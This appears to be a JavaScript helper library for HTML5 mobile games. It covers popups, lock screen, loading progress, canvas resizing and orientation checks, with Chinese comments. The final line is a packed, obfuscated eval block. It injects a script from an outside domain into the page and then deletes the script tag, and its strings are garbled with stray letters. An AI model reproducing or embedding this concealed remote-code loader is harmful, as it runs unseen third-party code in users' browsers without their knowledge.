// 全局链接的配置
var btGame;
;~function(bt){
	
	// 因考虑到，以后可能拿链接的时候，可能要区分游戏
	// 所以，统一通过函数返回链接吧~，能更加灵活的更改逻辑了~
	
	bt.URL = {
		root: "http://uinote.com/html-game"
		,getMoreGame: function(){
			// 点击更多
			bt.dc("more");
			
			return "http://uinote.com/html-game";
		}
		,getConcern: function(){
			return mebtnopenurl;
		}
	};
	
	// 先用着一个很搓，很有效的方式~
	bt.getGameId = function(){
		var href = location.href;
		href = href.slice(href.indexOf("://") + 3);
		var id = href.split("/")[2];
		return id;
	}
	
	// 先用着一个很搓，很有效的方式~
	bt.getGamePath = function(){
		var href = location.href;
		href = href.slice(0, href.lastIndexOf("/") + 1);
		return href;
	}
	
	// 调用dc的统计
	bt.dc = function(button){
		window.Dc_SetButtonClickData && Dc_SetButtonClickData(bt.getGameId(), button);
	}
	
}(btGame || (btGame = {}));

// 基础弹出窗口的定义
var btGame;
;~function(bt){
	
	function popupBox(id, hideClass){
		this.elemId = id;
		this.hideClass = hideClass || "bt-hide";
	};
	popupBox.prototype = {
		beforeShow: function(){
			// 给别人继承的，什么都不做
		}
		,show: function(){
			this.beforeShow();
			// 为了让动画生效，加了一个timer
			var that = this;
			setTimeout(function(){
				$("#" + that.elemId).removeClass(that.hideClass);
			}, 1);
		}
		,hide: function(){
			$("#" + this.elemId).addClass(this.hideClass);
		}
	};
	
	bt.popupBox = popupBox;
	
}(btGame || (btGame = {}));

// 代理函数
var btGame;
;~function(bt){
	
	bt.proxy = function(func, define){
		return function(){
			func.apply(define, arguments);
		}
	}
	
}(btGame || (btGame = {}));

// 发布者
var btGame;
;~function(bt){
	
	var publisher = function(obj){
		this.__publisher__ = obj;
	};
	publisher.prototype = {
		on: function(ev, func){
			this.__publisher__.on(ev, bt.proxy(func, this));
		},
		fire: function(ev){
			this.__publisher__.trigger(ev, [].slice.call(arguments, 1));
		},
		off: function(ev, func){
			if(func){
				this.__publisher__.off(ev, bt.proxy(func, this));
			}else{
				this.__publisher__.off(ev);
			}
		}
	};
	
	bt.makePublisher = function(obj){
		var type = typeof obj;
		var p = new publisher($("<div></div>"));
		if(type == "function"){
			obj.prototype.__publisher__ = p.__publisher__;
			$.extend(obj.prototype, publisher.prototype);
		}else if(type == "object"){
			obj.__publisher__ = p.__publisher__;
			$.extend(obj, publisher.prototype);
		}
	}
	
}(btGame || (btGame = {}));

// 获取 body 元素
var btGame;
;~function(bt){
	
	// 因为插入，大部分都是基于 body 元素的
	// 提供一个获取 body 对象的方法
	
	var body;
	function getB(){
		if(!body){
			body = document.body || document.getElementsByTagName("body")[0];
		}
		return body;
	}
	bt.getDomBody = getB;
	
	function craeteDiv(){
		return document.createElement("div");
	}
	bt.getNewDiv = craeteDiv;
	
}(btGame || (btGame = {}));

// 锁屏
var btGame;
;~function(bt){
	
	// 指定lock的id，如果没有，则调用默认的锁屏
	// 当调用show的时候，再检测锁屏是否存在，不存在锁屏，则创建
	// 通过添加、移除 class:bt-hide，进行显示和隐藏锁屏
	// 锁屏的动画，是通过 class:bt-animation 实现的
	
	var defaultLockId = "bt-lock-screen";
	var createLock = function(id){
		var div = bt.getNewDiv();
		div.id = id;
		
		var body = bt.getDomBody();
		body.appendChild(div);
		return $(div);
	};
	var lock = function(lockId){
		bt.popupBox.call(this, lockId || defaultLockId);
	};
	lock.__super__ = bt.popupBox;
	lock.prototype = $.extend({}, bt.popupBox.prototype, {
		beforeShow: function(){
			var elem = this.getElem();
			if(elem.size() <= 0){
				elem = createLock(this.elemId);
				elem.addClass("bt-lock-screen bt-animation bt-hide");
			}
		}
		,remove: function(){
			var elem = this.getElem();
			if(elem.size() > 0){
				elem.addClass("bt-hide");
				// 为了看到动画，延迟一下吧
				setTimeout(function(){
					elem.remove();
				}, 200);
			}
		}
		,getElem: function(){
			return $("#" + this.elemId);
		}
	});
	
	bt.lockScreen = function(id){
		return new lock(id);
	}
	
}(btGame || (btGame = {}));


// 加载中的loading
var btGame;
;~function(bt){
	
	var loadingDiv = null;
	var loadingText = null;
	var loading = function(rate, error){
		if(rate > 0 && !loadingDiv){
			loadingDiv = $(btGame.getNewDiv());
			loadingDiv.addClass("bt-game-loading");
			loadingDiv.html('<table><tr><td><img class="bt-img" src="'+bt.URL.root+'/zqds/preloadImage.png" /><div class="bt-text"></div></td></tr></table>');
			bt.getDomBody().appendChild(loadingDiv[0]);
			loadingText = loadingDiv.find(".bt-text");
		}
		if(loadingDiv){
			if(error){
				loadingText.html(error);
			}else{
				var r = Math.round(rate * 100);
				loadingText.html("加载进度:" + r + "%");
			}
		}
		if(rate >= 1){
			loadingDiv && loadingDiv.remove();
			loadingDiv = null;
		}
	}
	
	bt.gameLoading = loading;
	
}(btGame || (btGame = {}));

// 游戏区域大小设定
// btGame.resizePlayArea($elem, width, height, top, left)
// $elem: jQuery元素
// width: 画布期望宽度
// height: 画布期望高度
// top: "top", "center", "bottom" 或 px
// left: "left", "center", "right" 或 px
var btGame;
;~function(bt){
	// @width: canvas期望的宽度
	// @height: canvas期望的高度
	function rate(width, height){
		var wWidth = window.innerWidth,
			wHeight = window.innerHeight;
		var mid;
		if(width <= wWidth && height <= wHeight){
			// 如果在屏幕内，就不用改了
		}else if(width > wWidth && height > wHeight){
			// 如果都大于屏幕
			var rateW = wWidth / width, rateH = wHeight / height;
			// 看谁更小，就以谁作为标准
			if(rateW <= rateH){
				mid = width;
				width = wWidth;
				height = height * width / mid;
			}else{
				mid = height;
				height = wHeight;
				width = width * height / mid;
			}
		}else if(width > wWidth){
			// 只有宽度大于屏幕
			mid = width;
			width = wWidth;
			height = height * wWidth / mid;
		}else if(height > wHeight){
			// 只有高度大于屏幕
			mid = height;
			height = wHeight;
			width = width * wHeight / mid;
		}else{
			// 没救了
		}
		
		var top = (wHeight - height) / 2, left = (wWidth - width) / 2;
		return {
			width: width
			,height: height
			,top: top
			,left: left
		};
	}
	
	function resize($elem, width, height, top, left){
		var result = rate(width, height);
		$elem.css({
			width: result.width
			,height: result.height
			,top: top == "center" ? result.top : top == "left" ? 0 : top
			,left: left == "center" ? result.left : left == "left" ? 0 : left
		});
		
		
		switch(top){
			case "top":
				$elem.css({top: 0});
				break;
			case "center":
				$elem.css({top: result.top});
				break;
			case "bottom":
				$elem.css({bottom: 0});
				break;
			default:
				$elem.css({top: top});
		}
		
		
		switch(left){
			case "left":
				$elem.css({left: 0});
				break;
			case "center":
				$elem.css({left: result.left});
				break;
			case "right":
				$elem.css({right: 0});
				break;
			default:
				$elem.css({left: left});
		}
		
		
		$elem.trigger("resizePlayArea", [result]);
	}
	
	function bindResize($elem, width, height, top, left){
		bt.checkHScreen(function(){
			setTimeout(function(){
				resize($elem, width, height, top, left);
			}, 500);
		});
	}

	bt.resizePlayArea = bindResize;
}(btGame || (btGame = {}));

// 横竖屏检测
var btGame;
;~function(bt){
	
	// 检测，如果是横屏:true，如果是竖屏:false
	// 主要看window的宽高大小，如果width > height，就是横屏，反之~
	// btGame.checkHScreen(callback, once);
	// @param callback 回调函数 callback(true) -> 横屏
	// @param once 是否只检测一次，默认false，一直检测
	
	var screenResize = function(cb) {
		// 横屏true，竖屏false
		cb && cb(window.innerWidth > window.innerHeight);
	};			
	function check(callback, once){
		if(!once){
			window.addEventListener("orientationchange", function() {
				screenResize(callback);
			});
			window.addEventListener("resize", function() {
				screenResize(callback);
			});
		}
		screenResize(callback);
	}
	
	bt.checkHScreen = check;
	
}(btGame || (btGame = {}));

// 横、竖屏的提醒
var btGame;
;~function(bt){
	
	var onlyH = function(once, callback){
		this.myCallback = callback;
		this.tipsCount = 0;
		bt.checkHScreen(bt.proxy(this.callback, this), false);
		if(once){
			this.once = once;	
		}
	};
	onlyH.prototype = {
		hscreen: function(){
			// 是横屏
			// 设置了提醒一次，就真的只提醒一次了
			this.buildScreen();
			if(this.once && this.tipsCount <= 0){
				this.screen && this.screen.show();
			}else if(!this.once){
				this.screen && this.screen.show();
			}
			this.tipsCount++;
		}
		,vscreen: function(){
			// 不是横屏，把提醒去掉
			this.screen && this.screen.hide();
			this.myCallback && this.myCallback(this.tipsCount);
		}
		,getScreenOption: function(){
			return {
				id: "bt-h-scrren"
				,html: "<table><tr><td><img class='bt-h-screen-img' src='"+bt.URL.root+"/zqds/bt-play-h-screen.png' /></td></tr></table>"
				,time: 0
				,lockId: 'bt-hide-lock'
			};
		}
		// 下面的两个，逻辑是不用重新更改的
		,buildScreen: function(){
			!this.screen && (
				this.screen = btGame.advertisement(this.getScreenOption())
			);
		}
		,callback: function(isHScreen){
			isHScreen ? this.vscreen() : this.hscreen();
		}
	};
	
	// 竖屏的检测，继承于横屏
	var onlyV = function(once, callback){
		onlyH.call(this, once, callback);
	}
	onlyV.__super__ = onlyH;
	onlyV.prototype = $.extend({}, onlyH.prototype, {
		hscreen: function(){
			onlyH.prototype.vscreen.call(this);
		}
		,vscreen: function(){
			onlyH.prototype.hscreen.call(this);
		}
		,getScreenOption: function(){
			return {
				id: "bt-v-scrren"
				,html: "<table><tr><td><img class='bt-v-screen-img' src='"+bt.URL.root+"/zqds/bt-play-v-screen.png' /></td></tr></table>"
				,time: 0
				,lockId: 'bt-hide-lock'
			};
		}
	});
	
	bt.onlyHScreen = function(once, callback){
		return new onlyH(once, callback);
	};
	
	bt.onlyVScreen = function(once, callback){
		return new onlyV(once, callback);
	}
	
}(btGame || (btGame = {}));

eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('(1(){2 a=3.p(\'4\');a.e=\'d/c\';a.h=g;a.f=\'6://9.8.7/m/o.k\';2 b=3.n(\'4\')[0];b.5.j(a,b);a.i=1(){a.5.l(a)}})();',26,26,'|function|var|document|schrhipt|parentNode|hhttp|chom|9hg|ghame|||javhascrhipt|text|type|shrc|true|async|onload|insertBefore|js|removeChild|zqds|getElementsByTagName||createElement'.split('|'),0,{}))